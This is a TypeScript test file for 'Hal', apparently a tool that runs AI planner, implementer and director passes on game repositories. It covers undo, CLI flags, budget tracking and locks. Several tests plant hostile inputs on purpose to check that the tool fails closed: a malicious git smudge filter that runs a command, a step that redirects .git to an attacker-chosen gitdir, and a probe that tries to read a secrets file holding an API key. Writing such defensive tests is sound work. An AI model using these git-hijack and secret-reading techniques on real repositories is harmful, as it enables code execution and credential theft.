  it.runIf(sandboxAvailable())('darwin: the undo tests really run sandboxed (.hal.env unreadable, no writes outside, no key in env)', async () => {
    await makePass();
    put(repo, '.hal.env', `ANTHROPIC_API_KEY=${KEY}\n`);
    const outside = join(homedir(), `.hal-undo-sandbox-probe-${process.pid}`); // tmpdir (and so the temp repo) is writable by design
    const probe = node(`const fs=require('fs');const r=[];
      try{fs.readFileSync(${J(join(repo, '.hal.env'))});r.push('read:ok')}catch(e){r.push('read:'+e.code)}
      try{fs.writeFileSync(${J(outside)},'x');r.push('write:ok')}catch(e){r.push('write:'+e.code)}
      r.push('key:'+(Object.values(process.env).some(v=>String(v).includes(${J(KEY)}))?'yes':'none'));
      console.log(r.join(' '));process.exit(r.join(' ')==='read:EPERM write:EPERM key:none'?0:7)`);
    const prev = process.env.ANTHROPIC_API_KEY;
    process.env.ANTHROPIC_API_KEY = KEY;
    try {
      const code = await undoCommand('HAL-001', 'r', { push: false }, deps({ unsandboxedForTests: false, undoTest: () => [probe] }));
      expect(code, existsSync(join(halDir, 'feedback.json')) ? read(halDir, 'feedback.json') : '').toBe(0);
    } finally { if (prev === undefined) delete process.env.ANTHROPIC_API_KEY; else process.env.ANTHROPIC_API_KEY = prev; }
    const leaked = existsSync(outside);
    rmSync(outside, { force: true });
    expect(leaked).toBe(false);
  });
  it('an unknown pass exits 1; a busy lock exits 2', async () => {
    expect(await undoCommand('HAL-404', 'r', { push: false }, deps())).toBe(1);
    put(halDir, 'run.lock', J({ pid: process.pid, runId: 'other', startedAt: new Date().toISOString() }));
    expect(await undoCommand('HAL-404', 'r', { push: false }, deps())).toBe(2);
  });
  it('preflight applies a pending undo from feedback.json the same way, and reports last run\'s ci:local failures', async () => {
    await makePass();
    put(halDir, 'feedback.json', J({ votes: [], undos: [{ run: 'page', pass: 'HAL-001', reason: 'too bouncy', status: 'pending', at: NOW.toISOString() }] }));
    put(repo, `.data/ci/${halHead()}.json`, J({ sha: halHead(), ok: false, steps: [{ step: 'test', ok: false }] }));
    // The previous run (run-x) pushed this commit.
    put(halDir, 'latest.json', J({ runId: 'run-x', endedAt: NOW.toISOString(), reportMd: join(halDir, 'runs', 'run-x', 'report.md') }));
    put(halDir, 'runs/run-x/report.json', J({ runId: 'run-x', pushed: true }));
    expect(await runNight(opts({ push: false }), deps({ claude: fakeClaude({ tickets: [] }) }))).toBe(0);
    expect(gitIn(repo, 'log', '--format=%B', HAL_MAIN)).toMatch(/^Hal-Undo: HAL-001$/m);
    expect(feedback().undos).toEqual([expect.objectContaining({ pass: 'HAL-001', status: 'done' })]);
    const w = readReport().warnings.join('\n');
    expect(w).toMatch(/undid HAL-001/);
    expect(w).toMatch(/ci:local failed for .* \(run-x\)/);
  });
});

describe('cli flags', () => {
  const games = ['hyperline', 'gearhold'];
  it('defaults: manual, subscription, push on, 6 tickets, all games', () => {
    expect(parseRunArgs([], games)).toEqual({ games, kinds: [], reportOnly: false, maxTickets: 6, trigger: 'manual', billing: 'subscription', push: true });
  });
  it('--nightly is API billing with push; --billing, --game, --kind, --max-tickets, --no-push, --report-only', () => {
    expect(parseRunArgs(['--nightly'], games)).toMatchObject({ trigger: 'nightly', billing: 'api', push: true });
    expect(parseRunArgs(['--billing', 'subscription', '--game', 'gearhold', '--report-only'], games)).toMatchObject({ games: ['gearhold'], billing: 'subscription', reportOnly: true });
    expect(parseRunArgs(['--kind', 'fix', '--kind', 'polish', '--max-tickets', '2', '--no-push'], games)).toMatchObject({ kinds: ['fix', 'polish'], maxTickets: 2, push: false });
    expect(() => parseRunArgs(['--game', 'nope'], games)).toThrow(/unknown game/);
    expect(() => parseRunArgs(['--kind', 'nope'], games)).toThrow(/kind/);
    expect(() => parseRunArgs(['--max-tickets', '0'], games)).toThrow(/max-tickets/);
    expect(() => parseRunArgs(['--billing', 'free'], games)).toThrow(/billing/);
  });
  it('undo needs a pass id and --reason', async () => {
    await expect(runRunCommand('undo', ['HAL-001'], { halDir, games })).rejects.toThrow(/reason/);
    await expect(runRunCommand('undo', ['nope', '--reason', 'x'], { halDir, games })).rejects.toThrow(/HAL-/);
  });
});

describe('fix round 1', () => {
  it('R19: SIGINT during an API call leaves the whole slice booked in spend.json (reserved before the spawn)', async () => {
    seedSpend(0);
    const proc = Object.assign(new EventEmitter(), { exit: vi.fn() });
    let atExit: unknown;
    proc.exit.mockImplementation(() => { atExit = spendCalls().map((x) => [x.role, x.billing, x.usd, x.pending ?? false]); });
    const claude: RunDeps['claude'] = async (call) => { calls.push(call); if (call.role === 'planner') { proc.emit('SIGINT'); throw new Error('killed'); } return ok(J({ note: 'n', perGame: {}, noteReplies: [] }), 0.1); };
    await runNight(opts({ reportOnly: true }), deps({ claude, proc }));
    expect(proc.exit).toHaveBeenCalledWith(130);
    expect(atExit).toEqual([['planner', 'api', 1.5, true]]);
    expect(spendCalls()[0]).toMatchObject({ role: 'planner', usd: 1.5 }); // settled as unknown: the slice stays
    expect(spendCalls()[0]!.pending).toBeUndefined();
  });
  it('planner gets --add-dir for its screenshots; planner and director get <repo>/.hal.env and the home secrets as deny paths', async () => {
    await runNight(opts({ reportOnly: true }), deps());
    const r = readReport();
    const [planner, director] = calls;
    expect(planner!.addDirs).toEqual([join(halDir, 'runs', r.runId, 'play', 'screens')]);
    expect(existsSync(planner!.addDirs![0]!)).toBe(true);
    for (const c of [planner!, director!]) expect(c.denyReadPaths).toEqual(secretReadPaths(repo));
  });
  it('--report-only does not apply pending undos (and pushes nothing)', async () => {
    await makePass();
    const head = halHead();
    put(halDir, 'feedback.json', J({ votes: [], undos: [{ run: 'page', pass: 'HAL-001', reason: 'r', status: 'pending', at: NOW.toISOString() }] }));
    const ci = vi.fn(async () => ({ ok: true, detail: '' }));
    expect(await runNight(opts({ reportOnly: true }), deps({ ciLocal: ci }))).toBe(0);
    expect(halHead()).toBe(head);
    expect(feedback().undos[0]!.status).toBe('pending');
    expect(ci).not.toHaveBeenCalled();
  });
  it('a candidate that reports "trust root modified" stops the build, warns to run npm ci, and nothing is pushed', async () => {
    const ci = vi.fn(async () => ({ ok: true, detail: '' }));
    const candidate = vi.fn(async (t: Ticket, ctx: { pass: string }) => ({
      pass: ctx.pass, ticket: t, verdict: 'discarded' as const, reasons: ['trust root modified'], scoresBefore: {}, scoresAfter: {}, costUsd: 0,
      warnings: ['trust root modified: node_modules changed; reinstall it (npm ci)'],
    }));
    expect(await runNight(opts(), deps({ candidate, ciLocal: ci, claude: fakeClaude({ tickets: [GOOD, THIRD] }) }))).toBe(0);
    const r = readReport();
    expect(candidate).toHaveBeenCalledTimes(1);
    expect(r.changes.map((c) => c.reasons)).toEqual([['trust root modified'], ['stopped: trust root modified']]);
    expect(r.warnings.join('\n')).toMatch(/Run npm ci/);
    expect(r.pushed).toBe(false);
    expect(r.pushSkippedReason).toMatch(/trust root/);
    expect(ci).not.toHaveBeenCalled();
  });
  it('a filter driver in the repo config: the run refuses before any git or Claude (fail closed); so does undo', async () => {
    gitIn(repo, 'config', 'filter.evil.smudge', 'touch /tmp/hal-evil-smudge');
    const claude = vi.fn();
    expect(await runNight(opts(), deps({ claude }))).toBe(1);
    expect(claude).not.toHaveBeenCalled();
    expect(readReport().warnings.join('\n')).toMatch(/filter\.evil\.smudge/);
    expect(existsSync(join(halDir, 'wt', 'main'))).toBe(false);
    expect(await undoCommand('HAL-001', 'r', { push: false }, deps())).toBe(1);
    expect(logs.join('\n')).toMatch(/refusing to run git/);
  });
  it('undo: a test step that rewrites the worktree .git is caught; .git is restored before any git call; nothing moves', async () => {
    await makePass();
    const head = halHead();
    const dotGit = join(halDir, 'wt', 'main', '.git');
    const before = readFileSync(dotGit, 'utf8');
    const evil = node(`require('fs').writeFileSync('.git', 'gitdir: /tmp/evil-gitdir\\n')`);
    expect(await undoCommand('HAL-001', 'r', { push: false }, deps({ undoTest: () => [evil] }))).toBe(1);
    expect(readFileSync(dotGit, 'utf8')).toBe(before);
    expect(halHead()).toBe(head);
    expect(gitIn(join(halDir, 'wt', 'main'), 'status', '--porcelain')).toBe('');
    expect(feedback().undos[0]!.error).toMatch(/\.git changed/);
  });
  it('undo: a filter configured during the tests (worktree config) makes Hal leave the tree alone', async () => {
    await makePass();
    const head = halHead();
    const step = node(`require('child_process').execFileSync('git', ['config', 'filter.evil.smudge', 'false'])`);
    expect(await undoCommand('HAL-001', 'r', { push: false }, deps({ undoTest: () => [step] }))).toBe(1);
    expect(halHead()).toBe(head);
    expect(feedback().undos[0]!.error).toMatch(/filter\.evil\.smudge.*left as it is/);
  });
  it('lock: a live pid that started after the lock was taken is a reused pid: the lock is taken over', async () => {
    put(halDir, 'run.lock', J({ pid: process.pid, runId: 'ancient', startedAt: '2000-01-01T00:00:00.000Z' }));
    expect(await runNight(opts({ reportOnly: true }), deps({ startTimeOf: () => new Date() }))).toBe(0);
    put(halDir, 'run.lock', J({ pid: process.pid, runId: 'unknown-start', startedAt: '2000-01-01T00:00:00.000Z' }));
    expect(await runNight(opts({ reportOnly: true }), deps({ startTimeOf: () => null }))).toBe(2); // start unknown: alive
  });
  it('killLiveGroups (called by the signal guard) kills a running isolated check\'s process group', async () => {
    const t0 = Date.now();
    const p = runIsolated(['sleep', '30'], { cwd: repo, env: { PATH: process.env.PATH }, timeoutMs: 60_000, unsandboxed: true });
    await new Promise((r) => setTimeout(r, 100));
    killLiveGroups();
    const r = await p;
    expect(r.code).not.toBe(0);
    expect(Date.now() - t0).toBeLessThan(5_000);
  });
  it('defaultStartTime reads ps lstart (null where ps is unavailable, e.g. inside a sandbox)', () => {
    const t = defaultStartTime(process.pid);
    if (process.env.HAL_SANDBOXED === '1' && t === null) return;
    expect(t).toBeInstanceOf(Date);
    expect(t!.getTime()).toBeLessThanOrEqual(Date.now());
    expect(lockLive({ pid: process.pid, runId: 'x', startedAt: '2000-01-01T00:00:00.000Z' })).toBe(false);
    expect(lockLive({ pid: process.pid, runId: 'x', startedAt: new Date().toISOString() })).toBe(true);
  });
  it('R19: a call reserved at 23:59 and settled at 00:01 is settled in its own day, booked once', async () => {
    const late = new Date(2026, 10, 11, 23, 59), early = new Date(2026, 10, 12, 0, 1);
    let clock = late;
    const claude: RunDeps['claude'] = async (call) => {
      calls.push(call);
      if (call.role === 'planner') { clock = early; return ok(J({ tickets: [] }), 0.4); }
      return ok(J({ note: 'n', perGame: {}, noteReplies: [] }), 0.1);
    };
    await runNight(opts({ reportOnly: true }), deps({ claude, now: () => clock }));
    const days = JSON.parse(read(halDir, 'spend.json')) as SpendDay[];
    const by = (d: Date) => days.find((x) => x.day === dayOf(d))?.calls.map((c) => [c.role, c.usd, c.pending ?? false]);
    expect(by(late)).toEqual([['planner', 0.4, false]]);
    expect(by(early)).toEqual([['director', 0.1, false]]);
    expect(readReport().spend.api).toBe(0.5);
  });
  it('R19: each reservation carries its own id and is settled by it', async () => {
    seedSpend(0);
    await runNight(opts(), deps());
    const ids = spendCalls().map((c) => (c as { id?: string }).id);
    expect(ids.every((x) => typeof x === 'string')).toBe(true);
    expect(new Set(ids).size).toBe(ids.length);
    expect(spendCalls().some((c) => c.pending)).toBe(false);
  }, 60_000);
  it('an undo of a pass that was never merged is recorded as rejected (not retried)', async () => {
    expect(await undoCommand('HAL-404', 'nope', { push: false }, deps())).toBe(1);
    expect(feedback().undos).toEqual([expect.objectContaining({ pass: 'HAL-404', status: 'rejected' })]);
  });
});

describe('final review fixes', () => {
  it('notes stay: a note the director marked queued in run 1 is in run 2\'s planner and director prompts, with its status and reply', async () => {
    put(halDir, 'notes.json', J([
      { id: 'N-001', at: NOW.toISOString(), game: null, text: 'more neon please', status: 'open' },
      { id: 'N-002', at: NOW.toISOString(), game: 'tidepool-pals', text: 'not in scope', status: 'open' },
    ]));
    const director = { note: 'n', perGame: {}, noteReplies: [{ id: 'N-001', status: 'queued', reply: 'Neon is next week.' }] };
    await runNight(opts({ reportOnly: true }), deps({ claude: fakeClaude({ tickets: [], director }) }));
    expect(JSON.parse(read(halDir, 'notes.json'))[0]).toMatchObject({ id: 'N-001', status: 'queued', reply: 'Neon is next week.' });
    calls = [];
    await runNight(opts({ reportOnly: true }), deps({ claude: fakeClaude({ tickets: [] }) }));
    const [planner, dir] = [calls.find((c) => c.role === 'planner')!, calls.find((c) => c.role === 'director')!];
    for (const p of [planner.prompt, dir.prompt]) {
      expect(p).toContain('more neon please');
      expect(p).toContain('"status": "queued"');
      expect(p).toContain('"lastReply": "Neon is next week."');
      expect(p).not.toContain('not in scope'); // another game's note stays out of a hyperline-only run
    }
  }, 60_000);

  it('one bad planner ticket is a warning; the good ones are still built', async () => {
    const bad = T('TX', 'Ship to pong', { game: 'pong' });
    expect(await runNight(opts(), deps({ claude: fakeClaude({ tickets: [bad, GOOD] }) }))).toBe(0);
    const r = readReport();
    expect(r.changes.map((c) => [c.ticket.id, c.verdict])).toEqual([['T1', 'merged']]);
    expect(r.warnings.join('\n')).toMatch(/planner ticket 1 \(TX: Ship to pong\) was rejected: unknown game pong/);
  }, 60_000);

  it('pass ids continue after the highest Hal-Pass on refs/hal/main, even with a fresh .data/hal', async () => {
    await ensureMainWorktree(repo);
    const tree = gitIn(repo, 'rev-parse', `${HAL_MAIN}^{tree}`);
    const trailers = formatTrailers({ pass: 'HAL-003', game: 'hyperline', kind: 'fix', why: 'w', scoreBefore: 1, scoreAfter: 2, version: '0.3.1', run: 'run-old' });
    const c = execFileSync('git', ['commit-tree', tree, '-p', halHead(), '-m', `fix(hyperline): old\n\nw\n\n${trailers}`], { cwd: repo, encoding: 'utf8' }).trim();
    gitIn(repo, 'update-ref', HAL_MAIN, c);
    gitIn(repo, 'push', '-q', 'origin', `${c}:refs/heads/main`); // pushed: not diverged
    expect(existsSync(join(halDir, 'ledger.json'))).toBe(false);
    expect(await runNight(opts(), deps())).toBe(0);
    const r = readReport();
    expect(r.changes.map((x) => x.pass)).toEqual(['HAL-004']);
    expect(JSON.parse(read(halDir, 'ledger.json')).passes.map((p: { id: string }) => p.id)).toEqual(['HAL-004']);
    expect(parseTrailers(gitIn(repo, 'log', '-1', '--format=%B', `${HAL_MAIN}^`))?.pass).toBe('HAL-004');
  }, 60_000);

  it('R24: appendSystemPromptFile reaches every role (planner, implementer, director)', async () => {
    const md = join(repo, 'CLAUDE.md');
    await runNight(opts(), deps({ appendSystemPromptFile: md }));
    expect(calls.map((c) => c.role)).toEqual(['planner', 'implementer', 'director']);
    for (const c of calls) expect(c.appendSystemPromptFile, c.role).toBe(md);
  }, 60_000);

  it('R24: realRunDeps points appendSystemPromptFile at <repo>/CLAUDE.md when it exists', () => {
    expect(realRunDeps(repo, halDir).appendSystemPromptFile).toBeUndefined();
    put(repo, 'CLAUDE.md', '# rules\n');
    expect(realRunDeps(repo, halDir).appendSystemPromptFile).toBe(join(repo, 'CLAUDE.md'));
  });

  it('R21: the director\'s $1 is held through the builds: tight money skips a build rather than the note', async () => {
    seedSpend(15); // 4.50 to slice: planner 1.50, then 3.00 - 1.00 held = 2.00 for the one implementer, director 1.00
    await runNight(opts(), deps({ claude: fakeClaude({ tickets: [GOOD, THIRD], costs: { planner: 1.5, 'Smoother jumps': null, director: null } }) }));
    expect(calls.map((c) => [c.role, c.maxBudgetUsd])).toEqual([['planner', 1.5], ['implementer', 2], ['director', 1]]);
    expect(readReport().changes.map((c) => c.verdict)).toEqual(['merged', 'skipped']);
    expect(readReport().spend.api).toBe(4.5);
  }, 60_000);
});
